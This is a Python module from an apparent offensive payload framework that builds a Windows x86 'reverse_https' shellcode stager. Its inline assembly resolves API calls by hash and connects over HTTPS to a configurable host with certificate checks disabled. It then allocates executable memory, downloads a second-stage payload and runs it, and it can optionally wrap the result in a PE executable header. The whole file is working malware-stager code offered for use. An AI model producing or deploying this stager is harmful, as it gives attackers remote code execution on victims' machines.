
from keystone import *  # code assembler
from capstone import *  # code disassembler
from payloads.lib.get_api_shellcode import get_api_shellcode
from payloads.lib.exefile import exefile

HOST="127.0.0.1"    # Default Host Address
PORT=4444           # Default Port Number
FORMAT="raw"        # Default Format
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
URI_PATH = "/12345"

class reverse_https(object):
    def __init__(self) -> None:
        self.name = type(self).__name__
        self.platform = "windows"
        self.arch = "x86"
        self.sctype = "stager"
        self.description = "PUT THE SHELLCODE DESCRIPTION HERE"
        # Add your extra configuration here
        

    def remove_asm_comments(self, asm):
        asm = asm.split("\n")
        o = []
        for d in asm:
            if len(d) <= 0:
                continue
            s = d.find(";")
            if s < 0:
                s=0
                o.append(d[s:])
            else:
                o.append(d.replace(d[s:], ""))
        asm = "\n".join(o)
        return asm


    def assemble(self, disasm):
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        asm_enc, cnt = ks.asm(disasm)
        return asm_enc


    def disassemble(self, asm):
        cs = Cs(CS_ARCH_X86, CS_MODE_32)
        asmcode = ""
        for n in cs.disasm(bytes(asm), 0):
            asmcode += "    %s %s\n" % (n.mnemonic, n.op_str)
        return asmcode


    def build_shellcode(self):
        mz = exefile().mz_pe_header
        gas = get_api_shellcode()
        gas_sc, cnt = gas.assemble()

        # TODO: Create random USER_AGENT and URI_PATH

        rhttp='''
                pop ebp
                push 00074656Eh                 ;" ten"
                push 0696E6977h                 ;"iniw"
                push esp
                push 00726774Ch
                call ebp                        ;hash("kernel32.dll", "LoadLibraryA")    
                xor     edx, edx
                push    edx
                push    edx
                push    edx
                push    edx
                push    edx
                call    internetopen
                ;<USER_AGENT_DISASM>
        internetopen:    
                push    0A779563Ah              ;hash("wininet.dll", "InternetOpenA")
                call    ebp
                push    edx
                push    edx
                push    3
                push    edx
                push    edx
                push    {0:04X}h                ;port number
                call    call_internetconnect
                ;<URI_PATH_DISASM>
        internetconnect:
                push    eax
                push    0C69F8957h              ;hash("wininet.dll", "InternetConnect")
                call    ebp
                mov     esi, eax
                push    edx
                push    84E83200h               ;HTTP_OPEN_FLAGS
                                                ;(0x80000000 | # INTERNET_FLAG_RELOAD
                                                ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
                                                ; 0x00800000 | # INTERNET_FLAG_SECURE
                                                ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
                                                ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
                                                ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
                                                ; 0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
                                                ; 0x00001000 | # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
                                                ; 0x00000200 ) # INTERNET_FLAG_NO_UI
                push    edx
                push    edx
                push    edx
                push    edi
                push    edx
                push    esi
                push    3B2E55EBh               ;hash("wininet.dll", "HttpOpenRequestA")
                call    ebp
                xchg    eax, esi
                push    0Ah                     ;number of connection attempts
                pop     edi

            httpsendrequest:
                push    3380h                   ;(0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                                                ; 0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                                                ; 0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
                                                ; 0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
                                                ; 0x00000080 | # SECURITY_FLAG_IGNORE_REVOCATION)
                mov     eax, esp
                push    4
                push    eax
                push    1Fh                     ;INTERNET_OPTION_SECURITY_FLAGS
                push    esi
                push    869E4675h               ;hash("wininet.dll", "InternetSetOptionA")
                call    ebp
                push    edx
                push    edx
                push    edx
                push    edx
                push    esi
                push    7B18062Dh               ;hash("wininet.dll", "HttpSendRequestA")
                call    ebp
                test    eax, eax
                jnz     virtualalloc
                push    1388h
                push    0E035F044h              ;hash("kernel32.dll", "Sleep")
                call    ebp
                dec     edi
                jnz     httpsendrequest

            call_exit:
                call    exit_code

            virtualalloc:
                push    40h ; '@'
                push    1000h
                push    400000h
                push    edx
                push    0E553A458h              ;hash("kernel32.dll", "VirtualAlloc")
                call    ebp
                xchg    eax, edx
                push    edx
                push    edx
                mov     edi, esp

            internetreadfile:
                push    edx
                push    edi
                push    2000h
                push    edx
                push    esi
                push    0E2899612h              ;hash("wininet.dll", "InternetReadFile")
                call    ebp
                pop     edx
                test    eax, eax
                jz      call_exit
                mov     eax, [edi]
                add     edx, eax
                test    eax, eax
                jnz     internetreadfile
                pop     eax
                ret
        
        call_internetconnect:
                pop edi
                call internetconnect
                ;<HOST_ADDRESS_DISASM>
        
        exit_code:
                mov edx, 056A2B5F0h             ;hash("kernel32.dll", "ExitProcess")
                push 0
                push edx
                call ebp
        '''.format(PORT)

        # Fill with NOPs initially
        uagent = self.disassemble([0x90 for n in USER_AGENT] + [0x90]) # extra NOP is for null terminator
        rhttp = rhttp.replace(";<USER_AGENT_DISASM>", uagent)
        uripath = self.disassemble([0x90 for n in URI_PATH] + [0x90]) # extra NOP is for null terminator
        rhttp = rhttp.replace(";<URI_PATH_DISASM>", uripath)
        hostaddr = self.disassemble([0x90 for n in HOST] + [0x90]) # extra NOP is for null terminator
        rhttp = rhttp.replace(";<HOST_ADDRESS_DISASM>", hostaddr)
        rhttp = self.remove_asm_comments(rhttp)
        rhttp = self.assemble(rhttp)
        
        # Replace NOPs with actual data
        # offset 31 (USER_AGENT)
        # offset 169 (URI_PATH)
        # offset 327 (HOST_ADDRESS)
        rhttp[31:31+len(USER_AGENT)] = [ord(n) for n in USER_AGENT]
        rhttp[31+len(USER_AGENT)] = 0 # null terminator
        rhttp[169:169+len(URI_PATH)] = [ord(n) for n in URI_PATH]
        rhttp[169+len(URI_PATH)] = 0 # null terminator
        rhttp[327:327+len(HOST)] = [ord(n) for n in HOST]
        rhttp[327+len(HOST)] = 0 # null terminator

        asm = bytes(gas_sc) + bytes(rhttp)
        # The MZHeader that was used has 1 section
        # the section has FileAlignment of 0x200 bytes 
        # Pad with zeroes for file alignment
        # For Windows Executable
        if FORMAT.upper() == "EXE":
            asmlen = len(asm)
            zpad = 512 - asmlen
            zpad = [0 for n in range(zpad)]
            asm += bytes(zpad)
            asm = mz + asm

        return asm, len(asm)

